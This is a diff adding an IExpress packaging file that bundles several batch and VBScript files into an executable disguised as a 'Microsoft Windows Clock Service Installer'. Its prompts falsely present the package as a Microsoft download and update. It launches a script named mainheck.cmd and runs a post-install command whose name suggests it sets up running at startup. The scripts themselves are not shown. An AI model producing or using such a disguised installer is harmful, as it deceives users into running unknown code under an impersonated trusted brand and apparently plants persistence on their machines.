@@ -1,0 +1,49 @@
+[Version]
+Class=IEXPRESS
+SEDVersion=3
+[Options]
+PackagePurpose=InstallApp
+ShowInstallProgramWindow=2
+HideExtractAnimation=1
+UseLongFileName=0
+InsideCompressed=0
+CAB_FixedSize=0
+CAB_ResvCodeSigning=0
+RebootMode=N
+InstallPrompt=%InstallPrompt%
+DisplayLicense=%DisplayLicense%
+FinishMessage=%FinishMessage%
+TargetName=%TargetName%
+FriendlyName=%FriendlyName%
+AppLaunched=%AppLaunched%
+PostInstallCmd=%PostInstallCmd%
+AdminQuietInstCmd=%AdminQuietInstCmd%
+UserQuietInstCmd=%UserQuietInstCmd%
+SourceFiles=SourceFiles
+[Strings]
+InstallPrompt=Dear User, Thank you for downloading Microsoft Clock Serviced! Please proceed to installl the clock service! If you are not intrested to proceed, you can press No. Special thanks to AaronSeesClouds for The Clock widget design!
+DisplayLicense=C:\Users\vilja\Desktop\bluethedevheck\licence.txt
+FinishMessage=Congatulations! Your Update Has been installed. Good Luck!
+TargetName=C:\Users\vilja\Desktop\bluethedevheck\heck output\Microsoft Windows Clock Service.EXE
+FriendlyName=Microsoft Windows Clock Service Installer
+AppLaunched=mainheck.cmd
+PostInstallCmd=iwillrunonstartup.cmd
+AdminQuietInstCmd=
+UserQuietInstCmd=
+FILE0="defeatchanges.cmd"
+FILE1="hehee.cmd"
+FILE2="iwillrunonstartup.cmd"
+FILE3="licence.txt"
+FILE4="setupstartup.cmd"
+FILE5="dabox.vbs"
+FILE6="mainheck.cmd"
+[SourceFiles]
+SourceFiles0=C:\Users\vilja\Desktop\bluethedevheck\
+[SourceFiles0]
+%FILE0%=
+%FILE1%=
+%FILE2%=
+%FILE3%=
+%FILE4%=
+%FILE5%=
+%FILE6%=
